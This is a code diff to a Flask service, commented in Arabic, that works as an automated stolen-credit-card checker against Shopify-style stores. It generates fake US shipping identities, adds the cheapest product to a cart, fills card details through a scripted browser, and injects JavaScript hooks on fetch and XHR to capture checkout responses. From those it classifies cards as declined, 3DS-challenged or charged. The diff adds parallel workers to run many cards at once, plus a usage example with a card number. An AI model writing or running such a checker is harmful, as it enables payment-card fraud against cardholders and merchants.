@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية
 import time
 import re
 import json
@@ -22,16 +22,21 @@ import random
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 50
+MAX_WORKERS = 10  # عدد الطلبات المتوازية اللي تشتغل بنفس الوقت
 REQUEST_TIMEOUT = 60
 TASK_QUEUE = queue.Queue()
+
+# منفذ العمليات المتوازية - هذا اللي يخلي الطلبات تشتغل بنفس الوقت
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# عداد لتتبع الطلبات النشطة
+active_tasks = {}
+active_tasks_lock = threading.Lock()
+
 # ==================== نظام توليد عناوين أمريكية متطابقة ====================
-# قوائم بيانات متطابقة: الاسم الأول + اسم العائلة + المدينة + الولاية + zip كلها متناسقة
 MATCHED_ADDRESSES = [
     {
         "first_name": "James", "last_name": "Smith", "full_name": "James Smith",
@@ -135,41 +140,20 @@ MATCHED_ADDRESSES = [
     },
 ]
 
-# قائمة إضافية للأسماء فقط (للتبديل إن لزم)
-FIRST_NAMES = ['James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth',
-               'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica', 'Thomas', 'Sarah', 'Charles', 'Karen',
-               'Anthony', 'Lisa', 'Matthew', 'Nancy', 'Daniel', 'Betty', 'Paul', 'Helen', 'Mark', 'Sandra',
-               'Donald', 'Donna', 'George', 'Carol', 'Kenneth', 'Ruth', 'Steven', 'Sharon', 'Edward', 'Michelle',
-               'Brian', 'Laura', 'Ronald', 'Kimberly', 'Kevin', 'Deborah', 'Jason', 'Emily', 'Jeffrey', 'Amanda']
-
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
-              'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee',
-              'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker']
-
-STREET_NAMES = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Washington Ave', 'Park Ave', 'Lake Dr',
-                'Hill St', 'Pine St', 'Church St', 'Market St', 'Bridge St', 'River Rd', 'Forest Ave',
-                'Valley Rd', 'Mountain Ave', 'Sunset Blvd', 'Highland Ave', 'Grove St']
-
 def generate_matched_shipping_data():
     """
     توليد بيانات شحن أمريكية متطابقة بالكامل
-    الاسم، المدينة، الولاية، zip كلها متناسقة من قائمة MATCHED_ADDRESSES
     """
     address = random.choice(MATCHED_ADDRESSES).copy()
-    
-    # إضافة تنسيق إضافي عشوائي للبريد الإلكتروني
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
-    
     return address
 
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     """
-    طريقة استخراج جديدة - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
-    إذا لم يتم العثور على أي code يحتوي على _ ، ينتقل إلى __typename
+    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
     """
     
-    # تصفية الكودات المستبعدة أولاً
     valid_codes = []
     for code in all_codes:
         is_excluded = False
@@ -180,10 +164,8 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
         if not is_excluded:
             valid_codes.append(code)
     
-    # المرحلة 1: البحث عن codes تحتوي على شرطة سفلية _
     underscore_codes = [code for code in valid_codes if '_' in code]
     
-    # استبعاد patterns غير المرغوب فيها حتى لو كانت تحتوي على _
     unwanted_patterns = [
         'Free_Postal_Shipping', 'UPS_', 'Economy_', 'First_', 'Standard_', 'Priority_',
         'GroundAdvantage_', 'MediaMail_', 'Flat_', 'Shipping_', 'Express_',
@@ -201,11 +183,9 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
         if not is_unwanted:
             filtered_underscore_codes.append(code)
     
-    # إذا وجدنا codes تحتوي على _ بعد التصفية، نعيد أول واحد
     if filtered_underscore_codes:
         return filtered_underscore_codes[0], None
     
-    # المرحلة 2: إذا لم نجد codes تحتوي على _ ، نبحث في __typename عن ما يحتوي على _
     if all_typenames:
         typename_underscore = [t for t in all_typenames if '_' in t]
         filtered_typename_underscore = []
@@ -221,30 +201,35 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
         if filtered_typename_underscore:
             return filtered_typename_underscore[0], filtered_typename_underscore[0]
     
-    # المرحلة 3: إذا لم نجد أي شيء يحتوي على _ ، نرجع أول code عادي صالح
     if valid_codes:
         return valid_codes[0], None
     
-    # المرحلة 4: كملاذ أخير، نرجع أول typename
     if all_typenames:
         return all_typenames[0], all_typenames[0]
     
     return None, None
 
-def ff(ccx, site):
+def ff(ccx, site, task_id=None):
     """
+    دالة معالجة بطاقة واحدة وموقع واحد
+    تعمل بشكل مستقل تماماً - كل استدعاء له متصفحه الخاص
+    
     ccx: رقم البطاقة|الشهر|السنة|cvv
-    مثال: '4918460118934875|08|2027|293'
     site: رابط الموقع
-    مثال: 'https://www.militadowatch.com/'
+    task_id: معرف المهمة للتتبع
     """
     
-    # ==================== توليد بيانات شحن متطابقة ====================
+    # تسجيل بدء المهمة
+    if task_id:
+        with active_tasks_lock:
+            active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
+        logger.info(f"[{task_id}] Started task: {site}")
+    
     shipping_data = generate_matched_shipping_data()
     
     parts = ccx.split('|')
     if len(parts) != 4:
-        return {"success": False, "code": None, "error": "Invalid card format"}
+        return {"success": False, "code": None, "error": "Invalid card format", "task_id": task_id}
     
     card_data = {
         "number": parts[0].strip(),
@@ -283,7 +268,7 @@ def ff(ccx, site):
         
         r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
         if r.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to fetch products"}
+            return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
         
         products_data = r.json()
         shippable_products = []
@@ -314,7 +299,7 @@ def ff(ccx, site):
                     })
         
         if not shippable_products:
-            return {"success": False, "code": None, "error": "No shippable product"}
+            return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
         
         cheapest = min(shippable_products, key=lambda x: x['price'])
         variant_id = cheapest['variant_id']
@@ -322,13 +307,13 @@ def ff(ccx, site):
         
         resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
         if resp.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to add to cart"}
+            return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
         
         response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
         checkout_url = response.url
         
     except Exception as e:
-        return {"success": False, "code": None, "error": str(e)}
+        return {"success": False, "code": None, "error": str(e), "task_id": task_id}
     
     # ==================== 2. تشغيل المتصفح ====================
     driver = None
@@ -406,7 +391,7 @@ def ff(ccx, site):
             time.sleep(2)
             
         except:
-            return {"success": False, "code": None, "error": "Shipping fill failed"}
+            return {"success": False, "code": None, "error": "Shipping fill failed", "task_id": task_id}
         
         # ==================== 4. تعبئة الدفع ====================
         try:
@@ -489,31 +474,69 @@ def ff(ccx, site):
                     continue
             
             if not (card_filled and expiry_filled and cvv_filled and name_filled):
-                return {"success": False, "code": None, "error": "Payment fill failed"}
+                return {"success": False, "code": None, "error": "Payment fill failed", "task_id": task_id}
             
         except:
-            return {"success": False, "code": None, "error": "Payment error"}
+            return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
         
         # ==================== 5. اعتراض GraphQL ====================
         try:
             script = """
             window.graphqlResponses = [];
             window.allResponses = [];
+            window.pollForReceiptResponses = [];
             window.pageUrls = [];
             
             var originalFetch = window.fetch;
             window.fetch = function(url, options) {
-                return originalFetch.apply(this, arguments).then(function(response) {
+                var self = this;
+                var args = arguments;
+                
+                return originalFetch.apply(self, args).then(function(response) {
                     var clone = response.clone();
+                    var responseUrl = url;
+                    var requestBody = null;
+                    
+                    if (options && options.body) {
+                        try {
+                            requestBody = options.body;
+                        } catch(e) {}
+                    }
+                    
                     clone.text().then(function(text) {
                         var data = {
-                            url: url,
+                            url: responseUrl,
                             body: text,
+                            requestBody: requestBody,
                             timestamp: new Date().toISOString()
                         };
+                        
                         window.allResponses.push(data);
-                        if (url && url.includes('/checkouts/internal/graphql/persisted')) {
-                            window.graphqlResponses.push(data);
+                        
+                        if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
+                            
+                            var isProposal = false;
+                            if (requestBody) {
+                                try {
+                                    var parsedBody = JSON.parse(requestBody);
+                                    if (parsedBody.operationName === 'Proposal') {
+                                        isProposal = true;
+                                    }
+                                } catch(e) {}
+                            }
+                            
+                            if (!isProposal) {
+                                window.graphqlResponses.push(data);
+                                
+                                if (requestBody) {
+                                    try {
+                                        var parsedBody2 = JSON.parse(requestBody);
+                                        if (parsedBody2.operationName === 'PollForReceipt') {
+                                            window.pollForReceiptResponses.push(data);
+                                        }
+                                    } catch(e) {}
+                                }
+                            }
                         }
                     });
                     return response;
@@ -525,22 +548,52 @@ def ff(ccx, site):
             
             XMLHttpRequest.prototype.open = function(method, url) {
                 this._url = url;
+                this._method = method;
                 return originalXHROpen.apply(this, arguments);
             };
             
             XMLHttpRequest.prototype.send = function(body) {
                 var self = this;
+                var requestBody = body;
+                
                 this.addEventListener('load', function() {
                     try {
                         var text = self.responseText;
+                        var responseUrl = self._url;
+                        
                         var data = {
-                            url: self._url,
+                            url: responseUrl,
                             body: text,
+                            requestBody: requestBody,
                             timestamp: new Date().toISOString()
                         };
+                        
                         window.allResponses.push(data);
-                        if (self._url && self._url.includes('/checkouts/internal/graphql/persisted')) {
-                            window.graphqlResponses.push(data);
+                        
+                        if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
+                            
+                            var isProposal = false;
+                            if (requestBody) {
+                                try {
+                                    var parsedBody = JSON.parse(requestBody);
+                                    if (parsedBody.operationName === 'Proposal') {
+                                        isProposal = true;
+                                    }
+                                } catch(e) {}
+                            }
+                            
+                            if (!isProposal) {
+                                window.graphqlResponses.push(data);
+                                
+                                if (requestBody) {
+                                    try {
+                                        var parsedBody2 = JSON.parse(requestBody);
+                                        if (parsedBody2.operationName === 'PollForReceipt') {
+                                            window.pollForReceiptResponses.push(data);
+                                        }
+                                    } catch(e) {}
+                                }
+                            }
                         }
                     } catch(e) {}
                 });
@@ -637,7 +690,8 @@ def ff(ccx, site):
             for attempt in range(10):
                 time.sleep(1.5)
                 
-                responses = driver.execute_script("return window.allResponses || [];")
+                poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
+                graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
                 current_url = driver.current_url
                 final_url = current_url
                 
@@ -685,58 +739,12 @@ def ff(ccx, site):
                 except:
                     pass
                 
-                for resp in responses:
+                for resp in poll_responses:
                     body = resp.get('body', '')
                     url = resp.get('url', '')
                     
                     if not body:
                         continue
-                    
-                    if '/thank_you' in body or 'thank_you' in url:
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        break
-                    
-                    if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        break
-                    
-                    if 'Your order is confirmed' in body or 'Order confirmed' in body or 'order confirmed' in body.lower():
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                        if order_match:
-                            order_number = order_match.group(1)
-                        break
-                    
-                    if 'Thank you for your order' in body or 'thank you for your order' in body.lower():
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                        if order_match:
-                            order_number = order_match.group(1)
-                        break
-                    
-                    if '/persisted' in url and 'CompletePaymentChallenge' in body:
-                        try:
-                            data = json.loads(body)
-                            if 'data' in data and 'receipt' in data['data']:
-                                receipt = data['data']['receipt']
-                                if 'action' in receipt:
-                                    action = receipt['action']
-                                    if action.get('__typename') == 'CompletePaymentChallenge':
-                                        is_3ds = True
-                                        found_code = '3DS_REQUIRED'
-                                        found_typename = 'CompletePaymentChallenge'
-                                        response_result = '3DS Secure required - Please complete authentication'
-                                        break
-                        except:
-                            pass
                     
                     pattern = r'"code"\s*:\s*"([^"]+)"'
                     matches = re.findall(pattern, body, re.IGNORECASE)
@@ -805,6 +813,82 @@ def ff(ccx, site):
                                         response_result = message
                         except:
                             pass
+                
+                for resp in graphql_responses:
+                    body = resp.get('body', '')
+                    url = resp.get('url', '')
+                    
+                    if not body:
+                        continue
+                    
+                    if '/thank_you' in body or 'thank_you' in url:
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        break
+                    
+                    if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        break
+                    
+                    if 'Your order is confirmed' in body or 'Order confirmed' in body or 'order confirmed' in body.lower():
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
+                        if order_match:
+                            order_number = order_match.group(1)
+                        break
+                    
+                    if 'Thank you for your order' in body or 'thank you for your order' in body.lower():
+                        order_confirmed = True
+                        found_code = 'ORDER_CONFIRMED'
+                        response_result = 'Order confirmed - Thank you for your purchase!'
+                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
+                        if order_match:
+                            order_number = order_match.group(1)
+                        break
+                    
+                    if '/persisted' in url and 'CompletePaymentChallenge' in body:
+                        try:
+                            data = json.loads(body)
+                            if 'data' in data and 'receipt' in data['data']:
+                                receipt = data['data']['receipt']
+                                if 'action' in receipt:
+                                    action = receipt['action']
+                                    if action.get('__typename') == 'CompletePaymentChallenge':
+                                        is_3ds = True
+                                        found_code = '3DS_REQUIRED'
+                                        found_typename = 'CompletePaymentChallenge'
+                                        response_result = '3DS Secure required - Please complete authentication'
+                                        break
+                        except:
+                            pass
+                    
+                    if not all_codes:
+                        pattern = r'"code"\s*:\s*"([^"]+)"'
+                        matches = re.findall(pattern, body, re.IGNORECASE)
+                        for code in matches:
+                            if len(code) > 3 and len(code) < 80 and ' ' not in code:
+                                is_excluded = False
+                                for excluded in excluded_codes:
+                                    if excluded in code:
+                                        is_excluded = True
+                                        break
+                                if not is_excluded and code not in all_codes:
+                                    all_codes.append(code)
+                    
+                    if not all_typenames:
+                        if '__typename' in body:
+                            pattern = r'"__typename"\s*:\s*"([^"]+)"'
+                            matches = re.findall(pattern, body, re.IGNORECASE)
+                            for typename in matches:
+                                if len(typename) > 3 and len(typename) < 80:
+                                    if typename not in ['Query', 'Mutation', 'Subscription']:
+                                        if typename not in all_typenames:
+                                            all_typenames.append(typename)
                     
                     pattern = r'"status"\s*:\s*"([^"]+)"'
                     matches = re.findall(pattern, body, re.IGNORECASE)
@@ -903,7 +987,7 @@ def ff(ccx, site):
             if driver:
                 driver.quit()
             
-            # ==================== استخدام طريقة الاستخراج الجديدة ====================
+            # ==================== نتيجة الاستخراج ====================
             if order_confirmed:
                 result_code = 'ORDER_CONFIRMED'
                 result_typename = 'OrderConfirmed'
@@ -921,7 +1005,6 @@ def ff(ccx, site):
                 result_code = found_code
                 result_typename = found_typename
             else:
-                # استخدام دالة الاستخراج الجديدة التي تعطي أولوية للـ codes التي تحتوي على _
                 extracted_code, extracted_typename = extract_code_underscore_priority(
                     all_codes, all_typenames, excluded_codes
                 )
@@ -936,6 +1019,13 @@ def ff(ccx, site):
                     result_code = None
                     result_typename = None
             
+            # تحديث حالة المهمة
+            if task_id:
+                with active_tasks_lock:
+                    if task_id in active_tasks:
+                        active_tasks[task_id]["status"] = "completed"
+                        active_tasks[task_id]["result"] = result_code
+            
             if result_code:
                 return {
                     "success": True,
@@ -946,7 +1036,8 @@ def ff(ccx, site):
                     "order_number": order_number,
                     "checkout_url": checkout_url,
                     "final_url": final_url,
-                    "error": None
+                    "error": None,
+                    "task_id": task_id
                 }
             else:
                 return {
@@ -958,12 +1049,18 @@ def ff(ccx, site):
                     "order_number": None,
                     "checkout_url": checkout_url,
                     "final_url": final_url,
-                    "error": "Code not found"
+                    "error": "Code not found",
+                    "task_id": task_id
                 }
         
         except Exception as e:
             if driver:
                 driver.quit()
+            if task_id:
+                with active_tasks_lock:
+                    if task_id in active_tasks:
+                        active_tasks[task_id]["status"] = "error"
+                        active_tasks[task_id]["error"] = str(e)
             return {
                 "success": False,
                 "code": None,
@@ -973,12 +1070,18 @@ def ff(ccx, site):
                 "order_number": None,
                 "checkout_url": checkout_url,
                 "final_url": None,
-                "error": str(e)
+                "error": str(e),
+                "task_id": task_id
             }
     
     except Exception as e:
         if driver:
             driver.quit()
+        if task_id:
+            with active_tasks_lock:
+                if task_id in active_tasks:
+                    active_tasks[task_id]["status"] = "error"
+                    active_tasks[task_id]["error"] = str(e)
         return {
             "success": False,
             "code": None,
@@ -988,12 +1091,22 @@ def ff(ccx, site):
             "order_number": None,
             "checkout_url": checkout_url,
             "final_url": None,
-            "error": str(e)
+            "error": str(e),
+            "task_id": task_id
         }
 
 # ==================== Routes ====================
 @app.route('/', methods=['GET'])
 def home():
+    """
+    نقطة النهاية الرئيسية
+    
+    الاستخدام:
+    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
+    
+    مثال:
+    /?cc=4918460118934875|08|2027|293&url=https://www.example.com
+    """
     cc = request.args.get('cc')
     url = request.args.get('url')
     
@@ -1001,22 +1114,47 @@ def home():
         return jsonify({
             "success": False,
             "code": None,
-            "typename": None,
-            "response": None,
-            "price": None,
-            "order_number": None,
-            "checkout_url": None,
-            "final_url": None,
-            "error": "Missing cc or url parameters"
+            "error": "Missing cc or url parameters. Use /?cc=CARD&url=SITE"
         })
     
-    result = ff(cc, url)
-    return jsonify(result)
+    # توليد معرف للمهمة
+    task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
+    
+    # تنفيذ المهمة في Thread منفصل - هذا يسمح بتنفيذ عدة طلبات بنفس الوقت
+    future = executor.submit(ff, cc, url, task_id)
+    
+    try:
+        result = future.result(timeout=REQUEST_TIMEOUT)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "code": None,
+            "error": f"Task timeout or error: {str(e)}",
+            "task_id": task_id
+        })
+
+@app.route('/status', methods=['GET'])
+def status():
+    """
+    معرفة حالة جميع المهام النشطة
+    """
+    with active_tasks_lock:
+        return jsonify({
+            "active_tasks_count": len(active_tasks),
+            "max_workers": MAX_WORKERS,
+            "tasks": active_tasks
+        })
 
 @app.route('/health', methods=['GET'])
 def health():
-    return jsonify({"status": "ok"})
+    return jsonify({
+        "status": "ok",
+        "max_workers": MAX_WORKERS,
+        "active_tasks": len(active_tasks)
+    })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
+    # تشغيل Flask مع دعم threads للتوازي
     app.run(host='0.0.0.0', port=port, threaded=True)
